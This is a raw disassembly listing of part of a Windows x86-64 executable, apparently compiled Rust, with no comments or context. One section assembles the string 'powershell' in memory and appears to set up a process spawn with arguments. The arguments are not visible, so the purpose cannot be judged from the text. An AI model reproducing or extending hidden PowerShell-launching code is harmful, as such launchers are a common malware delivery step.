   140001ee6:	a8 01                	test   $0x1,%al
   140001ee8:	74 10                	je     0x140001efa
   140001eea:	48 89 d1             	mov    %rdx,%rcx
   140001eed:	e8 5e f5 ff ff       	call   0x140001450
   140001ef2:	49 89 c6             	mov    %rax,%r14
   140001ef5:	e9 69 03 00 00       	jmp    0x140002263
   140001efa:	48 8d 8c 24 48 02 00 	lea    0x248(%rsp),%rcx
   140001f01:	00 
   140001f02:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140001f07:	48 89 11             	mov    %rdx,(%rcx)
   140001f0a:	48 8d 15 0b 40 17 00 	lea    0x17400b(%rip),%rdx        # 0x140175f1c
   140001f11:	41 b8 00 fe 6e 00    	mov    $0x6efe00,%r8d
   140001f17:	e8 99 f5 ff ff       	call   0x1400014b5
   140001f1c:	48 85 c0             	test   %rax,%rax
   140001f1f:	74 10                	je     0x140001f31
   140001f21:	48 89 c1             	mov    %rax,%rcx
   140001f24:	e8 27 f5 ff ff       	call   0x140001450
   140001f29:	49 89 c6             	mov    %rax,%r14
   140001f2c:	e9 28 03 00 00       	jmp    0x140002259
   140001f31:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140001f36:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140001f3b:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001f40:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140001f45:	48 8d 05 fc 3d 86 00 	lea    0x863dfc(%rip),%rax        # 0x140865d48
   140001f4c:	4c 8d a4 24 80 01 00 	lea    0x180(%rsp),%r12
   140001f53:	00 
   140001f54:	49 89 04 24          	mov    %rax,(%r12)
   140001f58:	b8 02 00 00 00       	mov    $0x2,%eax
   140001f5d:	49 89 44 24 08       	mov    %rax,0x8(%r12)
   140001f62:	49 83 64 24 20 00    	andq   $0x0,0x20(%r12)
   140001f68:	48 8d 3d 11 ee 03 00 	lea    0x3ee11(%rip),%rdi        # 0x140040d80
   140001f6f:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140001f74:	4d 89 74 24 10       	mov    %r14,0x10(%r12)
   140001f79:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140001f7f:	4d 89 74 24 18       	mov    %r14,0x18(%r12)
   140001f84:	4c 89 e1             	mov    %r12,%rcx
   140001f87:	e8 e4 3f 03 00       	call   0x140035f70
   140001f8c:	48 8d 05 f5 3d 86 00 	lea    0x863df5(%rip),%rax        # 0x140865d88
   140001f93:	49 89 04 24          	mov    %rax,(%r12)
   140001f97:	4d 89 74 24 08       	mov    %r14,0x8(%r12)
   140001f9c:	bb 08 00 00 00       	mov    $0x8,%ebx
   140001fa1:	49 89 5c 24 10       	mov    %rbx,0x10(%r12)
   140001fa6:	0f 57 f6             	xorps  %xmm6,%xmm6
   140001fa9:	41 0f 11 74 24 18    	movups %xmm6,0x18(%r12)
   140001faf:	4c 8d a4 24 80 01 00 	lea    0x180(%rsp),%r12
   140001fb6:	00 
   140001fb7:	4c 89 e1             	mov    %r12,%rcx
   140001fba:	e8 b1 3f 03 00       	call   0x140035f70
   140001fbf:	48 8d 05 0a 3e 86 00 	lea    0x863e0a(%rip),%rax        # 0x140865dd0
   140001fc6:	49 89 04 24          	mov    %rax,(%r12)
   140001fca:	4d 89 74 24 08       	mov    %r14,0x8(%r12)
   140001fcf:	49 89 5c 24 10       	mov    %rbx,0x10(%r12)
   140001fd4:	41 0f 11 74 24 18    	movups %xmm6,0x18(%r12)
   140001fda:	4c 8d a4 24 80 01 00 	lea    0x180(%rsp),%r12
   140001fe1:	00 
   140001fe2:	4c 89 e1             	mov    %r12,%rcx
   140001fe5:	e8 86 3f 03 00       	call   0x140035f70
   140001fea:	48 c7 44 24 20 14 00 	movq   $0x14,0x20(%rsp)
   140001ff1:	00 00 
   140001ff3:	4c 8d 0d 0e 3f 17 00 	lea    0x173f0e(%rip),%r9        # 0x140175f08
   140001ffa:	4c 8d ac 24 60 01 00 	lea    0x160(%rsp),%r13
   140002001:	00 
   140002002:	4c 89 e9             	mov    %r13,%rcx
   140002005:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
   14000200a:	4c 89 f2             	mov    %r14,%rdx
   14000200d:	4d 89 f8             	mov    %r15,%r8
   140002010:	e8 9b ec 03 00       	call   0x140040cb0
   140002015:	41 0f 10 45 08       	movups 0x8(%r13),%xmm0
   14000201a:	48 8d 84 24 50 02 00 	lea    0x250(%rsp),%rax
   140002021:	00 
   140002022:	0f 11 00             	movups %xmm0,(%rax)
   140002025:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   14000202a:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   14000202f:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140002034:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140002039:	48 8d 05 e0 3d 86 00 	lea    0x863de0(%rip),%rax        # 0x140865e20
   140002040:	49 89 04 24          	mov    %rax,(%r12)
   140002044:	49 c7 44 24 08 03 00 	movq   $0x3,0x8(%r12)
   14000204b:	00 00 
   14000204d:	49 83 64 24 20 00    	andq   $0x0,0x20(%r12)
   140002053:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002058:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000205d:	48 89 bc 24 80 00 00 	mov    %rdi,0x80(%rsp)
   140002064:	00 
   140002065:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   14000206a:	49 89 44 24 10       	mov    %rax,0x10(%r12)
   14000206f:	b8 02 00 00 00       	mov    $0x2,%eax
   140002074:	49 89 44 24 18       	mov    %rax,0x18(%r12)
   140002079:	48 8d 8c 24 c8 00 00 	lea    0xc8(%rsp),%rcx
   140002080:	00 
   140002081:	48 8d 94 24 80 01 00 	lea    0x180(%rsp),%rdx
   140002088:	00 
   140002089:	e8 f2 0d 00 00       	call   0x140002e80
   14000208e:	bf 0a 00 00 00       	mov    $0xa,%edi
   140002093:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140002098:	e8 03 ed 03 00       	call   0x140040da0
   14000209d:	48 85 c0             	test   %rax,%rax
   1400020a0:	0f 84 89 03 00 00    	je     0x14000242f
   1400020a6:	48 b9 70 6f 77 65 72 	movabs $0x6568737265776f70,%rcx
   1400020ad:	73 68 65 
   1400020b0:	48 89 08             	mov    %rcx,(%rax)
   1400020b3:	66 c7 40 08 6c 6c    	movw   $0x6c6c,0x8(%rax)
   1400020b9:	48 8d 8c 24 a0 01 00 	lea    0x1a0(%rsp),%rcx
   1400020c0:	00 
   1400020c1:	48 89 79 e0          	mov    %rdi,-0x20(%rcx)
   1400020c5:	48 89 41 e8          	mov    %rax,-0x18(%rcx)
   1400020c9:	48 89 79 f0          	mov    %rdi,-0x10(%rcx)
   1400020cd:	45 31 f6             	xor    %r14d,%r14d
   1400020d0:	44 88 71 f8          	mov    %r14b,-0x8(%rcx)
   1400020d4:	48 83 21 00          	andq   $0x0,(%rcx)
   1400020d8:	48 89 59 08          	mov    %rbx,0x8(%rcx)
   1400020dc:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   1400020e1:	48 83 61 68 00       	andq   $0x0,0x68(%rcx)
   1400020e6:	48 83 61 78 00       	andq   $0x0,0x78(%rcx)
   1400020eb:	66 83 a1 80 00 00 00 	andw   $0x0,0x80(%rcx)
   1400020f2:	00 
   1400020f3:	48 89 69 18          	mov    %rbp,0x18(%rcx)
   1400020f7:	83 a1 8c 00 00 00 00 	andl   $0x0,0x8c(%rcx)
   1400020fe:	66 83 a1 88 00 00 00 	andw   $0x0,0x88(%rcx)
   140002105:	00 
   140002106:	44 88 b1 90 00 00 00 	mov    %r14b,0x90(%rcx)
   14000210d:	b8 06 00 00 00       	mov    $0x6,%eax
   140002112:	89 41 38             	mov    %eax,0x38(%rcx)
   140002115:	89 41 48             	mov    %eax,0x48(%rcx)
   140002118:	89 41 58             	mov    %eax,0x58(%rcx)
   14000211b:	c7 81 91 00 00 00 00 	movl   $0x2000000,0x91(%rcx)
   140002122:	00 00 02 
   140002125:	0f 10 84 24 d0 00 00 	movups 0xd0(%rsp),%xmm0
   14000212c:	00 
   14000212d:	48 8d 05 26 3d 86 00 	lea    0x863d26(%rip),%rax        # 0x140865e5a
   140002134:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002139:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000213e:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002143:	bd 20 00 00 00       	mov    $0x20,%ebp
   140002148:	31 ff                	xor    %edi,%edi
   14000214a:	48 83 ff 20          	cmp    $0x20,%rdi
   14000214e:	0f 84 8f 00 00 00    	je     0x1400021e3
   140002154:	4c 8b 7c 3c 38       	mov    0x38(%rsp,%rdi,1),%r15
   140002159:	4d 85 ff             	test   %r15,%r15
   14000215c:	0f 88 b4 02 00 00    	js     0x140002416
   140002162:	4c 8b 6c 3c 30       	mov    0x30(%rsp,%rdi,1),%r13
   140002167:	74 16                	je     0x14000217f
   140002169:	4c 89 f9             	mov    %r15,%rcx
   14000216c:	e8 2f ec 03 00       	call   0x140040da0
   140002171:	49 89 c4             	mov    %rax,%r12
   140002174:	48 85 c0             	test   %rax,%rax
   140002177:	0f 84 a5 02 00 00    	je     0x140002422
   14000217d:	eb 06                	jmp    0x140002185
   14000217f:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140002185:	4c 89 e1             	mov    %r12,%rcx
   140002188:	4c 89 ea             	mov    %r13,%rdx
   14000218b:	4d 89 f8             	mov    %r15,%r8
   14000218e:	e8 cd fd 03 00       	call   0x140041f60
   140002193:	4c 3b b4 24 a0 01 00 	cmp    0x1a0(%rsp),%r14
   14000219a:	00 
   14000219b:	75 15                	jne    0x1400021b2
   14000219d:	48 8d 8c 24 a0 01 00 	lea    0x1a0(%rsp),%rcx
   1400021a4:	00 
   1400021a5:	e8 16 f1 02 00       	call   0x1400312c0
   1400021aa:	48 8b 9c 24 a8 01 00 	mov    0x1a8(%rsp),%rbx
   1400021b1:	00 
   1400021b2:	48 83 64 2b e0 00    	andq   $0x0,-0x20(%rbx,%rbp,1)
   1400021b8:	4c 89 7c 2b e8       	mov    %r15,-0x18(%rbx,%rbp,1)
   1400021bd:	4c 89 64 2b f0       	mov    %r12,-0x10(%rbx,%rbp,1)
   1400021c2:	4c 89 7c 2b f8       	mov    %r15,-0x8(%rbx,%rbp,1)
   1400021c7:	c6 04 2b 00          	movb   $0x0,(%rbx,%rbp,1)
   1400021cb:	49 ff c6             	inc    %r14
   1400021ce:	4c 89 b4 24 b0 01 00 	mov    %r14,0x1b0(%rsp)
   1400021d5:	00 
   1400021d6:	48 83 c5 28          	add    $0x28,%rbp
   1400021da:	48 83 c7 10          	add    $0x10,%rdi
   1400021de:	e9 67 ff ff ff       	jmp    0x14000214a
   1400021e3:	4c 8d 84 24 50 02 00 	lea    0x250(%rsp),%r8
   1400021ea:	00 
   1400021eb:	41 83 20 00          	andl   $0x0,(%r8)
   1400021ef:	4c 8d 74 24 68       	lea    0x68(%rsp),%r14
   1400021f4:	48 8d 94 24 80 01 00 	lea    0x180(%rsp),%rdx
   1400021fb:	00 
   1400021fc:	4c 89 f1             	mov    %r14,%rcx
   1400021ff:	e8 3c 40 03 00       	call   0x140036240
   140002204:	49 8b 0e             	mov    (%r14),%rcx
   140002207:	49 8b 6e 10          	mov    0x10(%r14),%rbp
   14000220b:	48 83 fd 02          	cmp    $0x2,%rbp
   14000220f:	0f 85 aa 00 00 00    	jne    0x1400022bf
   140002215:	e8 36 f2 ff ff       	call   0x140001450
   14000221a:	49 89 c6             	mov    %rax,%r14
   14000221d:	48 8d 8c 24 80 01 00 	lea    0x180(%rsp),%rcx
   140002224:	00 
   140002225:	e8 f2 f3 ff ff       	call   0x14000161c
   14000222a:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   140002231:	00 
   140002232:	48 8b 94 24 d0 00 00 	mov    0xd0(%rsp),%rdx
   140002239:	00 
   14000223a:	e8 12 55 00 00       	call   0x140007751
   14000223f:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   140002246:	00 
   140002247:	48 8b 94 24 68 01 00 	mov    0x168(%rsp),%rdx
   14000224e:	00 
   14000224f:	e8 fd 54 00 00       	call   0x140007751
   140002254:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140002259:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000225e:	e8 a1 f4 03 00       	call   0x140041704
   140002263:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   14000226a:	00 
   14000226b:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
   140002272:	00 
   140002273:	e8 d9 54 00 00       	call   0x140007751
   140002278:	48 89 f9             	mov    %rdi,%rcx
   14000227b:	e8 84 f4 03 00       	call   0x140041704
   140002280:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   140002287:	00 
   140002288:	48 8b 94 24 28 01 00 	mov    0x128(%rsp),%rdx
   14000228f:	00 
   140002290:	e8 bc 54 00 00       	call   0x140007751
   140002295:	48 89 f1             	mov    %rsi,%rcx
   140002298:	e8 67 f4 03 00       	call   0x140041704
   14000229d:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   1400022a4:	00 
   1400022a5:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
   1400022ac:	00 
   1400022ad:	e8 9f 54 00 00       	call   0x140007751
   1400022b2:	48 8b b4 24 e8 00 00 	mov    0xe8(%rsp),%rsi
   1400022b9:	00 
   1400022ba:	e9 90 f8 ff ff       	jmp    0x140001b4f
   1400022bf:	4c 8b 6c 24 70       	mov    0x70(%rsp),%r13
   1400022c4:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   1400022cb:	00 
   1400022cc:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   1400022d3:	00 
   1400022d4:	4c 8b bc 24 90 00 00 	mov    0x90(%rsp),%r15
   1400022db:	00 
   1400022dc:	48 8b bc 24 98 00 00 	mov    0x98(%rsp),%rdi
   1400022e3:	00 
   1400022e4:	4c 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%r14
   1400022eb:	00 
   1400022ec:	e8 13 f4 03 00       	call   0x140041704
   1400022f1:	4c 89 e9             	mov    %r13,%rcx
   1400022f4:	e8 0b f4 03 00       	call   0x140041704
   1400022f9:	48 85 ed             	test   %rbp,%rbp
   1400022fc:	74 08                	je     0x140002306
   1400022fe:	4c 89 e1             	mov    %r12,%rcx
   140002301:	e8 fe f3 03 00       	call   0x140041704
   140002306:	48 85 db             	test   %rbx,%rbx
   140002309:	74 08                	je     0x140002313
   14000230b:	4c 89 f9             	mov    %r15,%rcx
   14000230e:	e8 f1 f3 03 00       	call   0x140041704
   140002313:	48 85 ff             	test   %rdi,%rdi
   140002316:	74 08                	je     0x140002320
   140002318:	4c 89 f1             	mov    %r14,%rcx
   14000231b:	e8 e4 f3 03 00       	call   0x140041704
   140002320:	4c 8d b4 24 80 01 00 	lea    0x180(%rsp),%r14
   140002327:	00 
   140002328:	4c 89 f1             	mov    %r14,%rcx
   14000232b:	e8 ec f2 ff ff       	call   0x14000161c
   140002330:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   140002337:	00 
   140002338:	48 8b 94 24 d0 00 00 	mov    0xd0(%rsp),%rdx
   14000233f:	00 
   140002340:	e8 0c 54 00 00       	call   0x140007751
   140002345:	48 8d 05 44 3b 86 00 	lea    0x863b44(%rip),%rax        # 0x140865e90
   14000234c:	49 89 06             	mov    %rax,(%r14)
   14000234f:	49 c7 46 08 01 00 00 	movq   $0x1,0x8(%r14)
   140002356:	00 
   140002357:	49 c7 46 10 08 00 00 	movq   $0x8,0x10(%r14)
   14000235e:	00 
   14000235f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002362:	41 0f 11 46 18       	movups %xmm0,0x18(%r14)
   140002367:	48 8d 8c 24 80 01 00 	lea    0x180(%rsp),%rcx
   14000236e:	00 
   14000236f:	e8 fc 3b 03 00       	call   0x140035f70
   140002374:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   14000237b:	00 
   14000237c:	48 8b 94 24 68 01 00 	mov    0x168(%rsp),%rdx
   140002383:	00 
   140002384:	e8 c8 53 00 00       	call   0x140007751
   140002389:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000238e:	e8 71 f3 03 00       	call   0x140041704
   140002393:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   14000239a:	00 
   14000239b:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
   1400023a2:	00 
   1400023a3:	e8 a9 53 00 00       	call   0x140007751
   1400023a8:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400023ad:	e8 52 f3 03 00       	call   0x140041704
   1400023b2:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   1400023b9:	00 
   1400023ba:	48 8b 94 24 28 01 00 	mov    0x128(%rsp),%rdx
   1400023c1:	00 
   1400023c2:	e8 8a 53 00 00       	call   0x140007751
   1400023c7:	48 89 f1             	mov    %rsi,%rcx
   1400023ca:	e8 35 f3 03 00       	call   0x140041704
   1400023cf:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   1400023d6:	00 
   1400023d7:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
   1400023de:	00 
   1400023df:	e8 6d 53 00 00       	call   0x140007751
   1400023e4:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   1400023eb:	00 
   1400023ec:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   1400023f3:	00 
   1400023f4:	e8 58 53 00 00       	call   0x140007751
   1400023f9:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   140002400:	00 
   140002401:	48 8b 94 24 e8 00 00 	mov    0xe8(%rsp),%rdx
   140002408:	00 
   140002409:	e8 43 53 00 00       	call   0x140007751
   14000240e:	45 31 f6             	xor    %r14d,%r14d
   140002411:	e9 65 f7 ff ff       	jmp    0x140001b7b
   140002416:	48 8d 0d 1b 66 86 00 	lea    0x86661b(%rip),%rcx        # 0x140868a38
   14000241d:	e8 2e 07 00 00       	call   0x140002b50
   140002422:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002427:	4c 89 fa             	mov    %r15,%rdx
   14000242a:	e8 fc 06 00 00       	call   0x140002b2b
   14000242f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002434:	ba 0a 00 00 00       	mov    $0xa,%edx
   140002439:	e8 ed 06 00 00       	call   0x140002b2b
   14000243e:	48 89 c6             	mov    %rax,%rsi
   140002441:	4d 85 ff             	test   %r15,%r15
   140002444:	74 0d                	je     0x140002453
   140002446:	ba 01 00 00 00       	mov    $0x1,%edx
   14000244b:	4c 89 e1             	mov    %r12,%rcx
   14000244e:	e8 fd 03 00 00       	call   0x140002850
   140002453:	48 89 f1             	mov    %rsi,%rcx
   140002456:	e8 f5 f6 03 00       	call   0x140041b50
   14000245b:	cc                   	int3
   14000245c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002460:	55                   	push   %rbp
   140002461:	41 56                	push   %r14
   140002463:	56                   	push   %rsi
   140002464:	57                   	push   %rdi
   140002465:	53                   	push   %rbx
   140002466:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   14000246d:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140002474:	00 
   140002475:	e8 d6 fb 03 00       	call   0x140042050
   14000247a:	48 8d 15 ff ee 02 00 	lea    0x2eeff(%rip),%rdx        # 0x140031380
   140002481:	31 c9                	xor    %ecx,%ecx
   140002483:	e8 84 f2 03 00       	call   0x14004170c
   140002488:	c7 45 a8 00 50 00 00 	movl   $0x5000,-0x58(%rbp)
   14000248f:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002493:	e8 ec f0 03 00       	call   0x140041584
   140002498:	e8 df f1 03 00       	call   0x14004167c
   14000249d:	4c 8b 05 6c 1b 04 00 	mov    0x41b6c(%rip),%r8        # 0x140044010
   1400024a4:	48 8d 15 7d 80 86 00 	lea    0x86807d(%rip),%rdx        # 0x14086a528
   1400024ab:	48 89 c1             	mov    %rax,%rcx
   1400024ae:	41 ff d0             	call   *%r8
   1400024b1:	8b 0d 51 0c 87 00    	mov    0x870c51(%rip),%ecx        # 0x140873108
   1400024b7:	85 c9                	test   %ecx,%ecx
   1400024b9:	0f 84 69 02 00 00    	je     0x140002728
   1400024bf:	ff c9                	dec    %ecx
   1400024c1:	e8 9e f0 03 00       	call   0x140041564
   1400024c6:	48 85 c0             	test   %rax,%rax
   1400024c9:	75 05                	jne    0x1400024d0
   1400024cb:	e8 60 f0 02 00       	call   0x140031530
   1400024d0:	48 89 05 01 0c 87 00 	mov    %rax,0x870c01(%rip)        # 0x1408730d8
   1400024d7:	48 8d 0d 9f f4 ff ff 	lea    -0xb61(%rip),%rcx        # 0x14000197d
   1400024de:	e8 96 f0 ff ff       	call   0x140001579
   1400024e3:	48 85 c0             	test   %rax,%rax
   1400024e6:	0f 84 86 00 00 00    	je     0x140002572
   1400024ec:	48 89 45 18          	mov    %rax,0x18(%rbp)
   1400024f0:	48 89 55 20          	mov    %rdx,0x20(%rbp)
   1400024f4:	48 8d 45 18          	lea    0x18(%rbp),%rax
   1400024f8:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400024fc:	48 8d 05 69 f4 ff ff 	lea    -0xb97(%rip),%rax        # 0x14000196c
   140002503:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140002507:	48 8d 05 02 4e 04 00 	lea    0x44e02(%rip),%rax        # 0x140047310
   14000250e:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002512:	48 c7 45 f0 02 00 00 	movq   $0x2,-0x10(%rbp)
   140002519:	00 
   14000251a:	48 c7 45 08 00 00 00 	movq   $0x0,0x8(%rbp)
   140002521:	00 
   140002522:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140002526:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000252a:	48 c7 45 00 01 00 00 	movq   $0x1,0x0(%rbp)
   140002531:	00 
   140002532:	8b 0d d0 0b 87 00    	mov    0x870bd0(%rip),%ecx        # 0x140873108
   140002538:	85 c9                	test   %ecx,%ecx
   14000253a:	0f 84 35 02 00 00    	je     0x140002775
   140002540:	ff c9                	dec    %ecx
   140002542:	e8 1d f0 03 00       	call   0x140041564
   140002547:	48 89 c6             	mov    %rax,%rsi
   14000254a:	48 85 c0             	test   %rax,%rax
   14000254d:	0f 84 c8 01 00 00    	je     0x14000271b
   140002553:	48 8b 05 26 0b 87 00 	mov    0x870b26(%rip),%rax        # 0x140873080
   14000255a:	48 39 c6             	cmp    %rax,%rsi
   14000255d:	75 1a                	jne    0x140002579
   14000255f:	8b 05 23 0b 87 00    	mov    0x870b23(%rip),%eax        # 0x140873088
   140002565:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002568:	0f 84 1a 02 00 00    	je     0x140002788
   14000256e:	ff c0                	inc    %eax
   140002570:	eb 25                	jmp    0x140002597
   140002572:	31 c0                	xor    %eax,%eax
   140002574:	e9 09 01 00 00       	jmp    0x140002682
   140002579:	b1 01                	mov    $0x1,%cl
   14000257b:	31 c0                	xor    %eax,%eax
   14000257d:	f0 0f b0 0d 07 0b 87 	lock cmpxchg %cl,0x870b07(%rip)        # 0x14087308c
   140002584:	00 
   140002585:	0f 85 02 02 00 00    	jne    0x14000278d
   14000258b:	48 89 35 ee 0a 87 00 	mov    %rsi,0x870aee(%rip)        # 0x140873080
   140002592:	b8 01 00 00 00       	mov    $0x1,%eax
   140002597:	89 05 eb 0a 87 00    	mov    %eax,0x870aeb(%rip)        # 0x140873088
   14000259d:	48 8d 05 dc 0a 87 00 	lea    0x870adc(%rip),%rax        # 0x140873080
   1400025a4:	48 89 45 38          	mov    %rax,0x38(%rbp)
   1400025a8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400025ac:	48 83 f8 01          	cmp    $0x1,%rax
   1400025b0:	74 03                	je     0x1400025b5
   1400025b2:	48 85 c0             	test   %rax,%rax
   1400025b5:	48 8d 45 38          	lea    0x38(%rbp),%rax
   1400025b9:	48 89 45 28          	mov    %rax,0x28(%rbp)
   1400025bd:	48 8d 7d 30          	lea    0x30(%rbp),%rdi
   1400025c1:	48 c7 45 30 00 00 00 	movq   $0x0,0x30(%rbp)
   1400025c8:	00 
   1400025c9:	48 8d 15 90 63 86 00 	lea    0x866390(%rip),%rdx        # 0x140868960
   1400025d0:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   1400025d4:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   1400025d8:	e8 53 17 00 00       	call   0x140003d30
   1400025dd:	48 8b 75 30          	mov    0x30(%rbp),%rsi
   1400025e1:	84 c0                	test   %al,%al
   1400025e3:	74 39                	je     0x14000261e
   1400025e5:	48 85 f6             	test   %rsi,%rsi
   1400025e8:	75 44                	jne    0x14000262e
   1400025ea:	48 8d 05 cf 6f 86 00 	lea    0x866fcf(%rip),%rax        # 0x1408695c0
   1400025f1:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   1400025f5:	48 c7 45 b0 01 00 00 	movq   $0x1,-0x50(%rbp)
   1400025fc:	00 
   1400025fd:	48 c7 45 b8 08 00 00 	movq   $0x8,-0x48(%rbp)
   140002604:	00 
   140002605:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002608:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   14000260c:	48 8d 15 bd 6f 86 00 	lea    0x866fbd(%rip),%rdx        # 0x1408695d0
   140002613:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002617:	e8 34 0d 00 00       	call   0x140003350
   14000261c:	0f 0b                	ud2
   14000261e:	89 f0                	mov    %esi,%eax
   140002620:	83 e0 03             	and    $0x3,%eax
   140002623:	83 f8 01             	cmp    $0x1,%eax
   140002626:	0f 84 b1 00 00 00    	je     0x1400026dd
   14000262c:	31 f6                	xor    %esi,%esi
   14000262e:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140002632:	ff 49 08             	decl   0x8(%rcx)
   140002635:	75 14                	jne    0x14000264b
   140002637:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   14000263e:	31 c0                	xor    %eax,%eax
   140002640:	86 41 0c             	xchg   %al,0xc(%rcx)
   140002643:	3c 02                	cmp    $0x2,%al
   140002645:	0f 84 53 01 00 00    	je     0x14000279e
   14000264b:	89 f0                	mov    %esi,%eax
   14000264d:	83 e0 03             	and    $0x3,%eax
   140002650:	83 f8 01             	cmp    $0x1,%eax
   140002653:	74 4a                	je     0x14000269f
   140002655:	48 8b 75 18          	mov    0x18(%rbp),%rsi
   140002659:	48 8b 7d 20          	mov    0x20(%rbp),%rdi
   14000265d:	48 8b 07             	mov    (%rdi),%rax
   140002660:	48 85 c0             	test   %rax,%rax
   140002663:	74 05                	je     0x14000266a
   140002665:	48 89 f1             	mov    %rsi,%rcx
   140002668:	ff d0                	call   *%rax
   14000266a:	48 83 7f 08 00       	cmpq   $0x0,0x8(%rdi)
   14000266f:	74 0c                	je     0x14000267d
   140002671:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   140002675:	48 89 f1             	mov    %rsi,%rcx
   140002678:	e8 d3 01 00 00       	call   0x140002850
   14000267d:	b8 01 00 00 00       	mov    $0x1,%eax
   140002682:	8b 0d a8 09 87 00    	mov    0x8709a8(%rip),%ecx        # 0x140873030
   140002688:	83 f9 03             	cmp    $0x3,%ecx
   14000268b:	0f 85 aa 00 00 00    	jne    0x14000273b
   140002691:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   140002698:	5b                   	pop    %rbx
   140002699:	5f                   	pop    %rdi
   14000269a:	5e                   	pop    %rsi
   14000269b:	41 5e                	pop    %r14
   14000269d:	5d                   	pop    %rbp
   14000269e:	c3                   	ret
   14000269f:	48 8d 7e ff          	lea    -0x1(%rsi),%rdi
   1400026a3:	48 8b 5e ff          	mov    -0x1(%rsi),%rbx
   1400026a7:	4c 8b 76 07          	mov    0x7(%rsi),%r14
   1400026ab:	49 8b 06             	mov    (%r14),%rax
   1400026ae:	48 85 c0             	test   %rax,%rax
   1400026b1:	74 05                	je     0x1400026b8
   1400026b3:	48 89 d9             	mov    %rbx,%rcx
   1400026b6:	ff d0                	call   *%rax
   1400026b8:	49 83 7e 08 00       	cmpq   $0x0,0x8(%r14)
   1400026bd:	74 0c                	je     0x1400026cb
   1400026bf:	49 8b 56 10          	mov    0x10(%r14),%rdx
   1400026c3:	48 89 d9             	mov    %rbx,%rcx
   1400026c6:	e8 85 01 00 00       	call   0x140002850
   1400026cb:	ba 08 00 00 00       	mov    $0x8,%edx
   1400026d0:	48 89 f9             	mov    %rdi,%rcx
   1400026d3:	e8 78 01 00 00       	call   0x140002850
   1400026d8:	e9 78 ff ff ff       	jmp    0x140002655
   1400026dd:	48 8d 7e ff          	lea    -0x1(%rsi),%rdi
   1400026e1:	48 8b 5e ff          	mov    -0x1(%rsi),%rbx
   1400026e5:	4c 8b 76 07          	mov    0x7(%rsi),%r14
   1400026e9:	49 8b 06             	mov    (%r14),%rax
   1400026ec:	48 85 c0             	test   %rax,%rax
   1400026ef:	74 05                	je     0x1400026f6
   1400026f1:	48 89 d9             	mov    %rbx,%rcx
   1400026f4:	ff d0                	call   *%rax
   1400026f6:	49 83 7e 08 00       	cmpq   $0x0,0x8(%r14)
   1400026fb:	74 0c                	je     0x140002709
